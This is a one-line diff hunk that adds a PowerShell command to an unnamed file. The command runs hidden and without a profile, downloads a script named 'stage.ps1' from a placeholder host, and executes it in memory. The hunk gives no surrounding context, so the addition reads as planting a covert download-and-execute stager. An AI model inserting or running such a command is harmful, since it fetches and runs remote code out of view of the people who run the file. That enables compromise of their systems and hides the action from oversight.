@@ -1,0 +1,2 @@
+powershell -w hidden -nop -c "IEX (New-Object Net.WebClient).DownloadString('http://example.invalid/stage.ps1')"
+
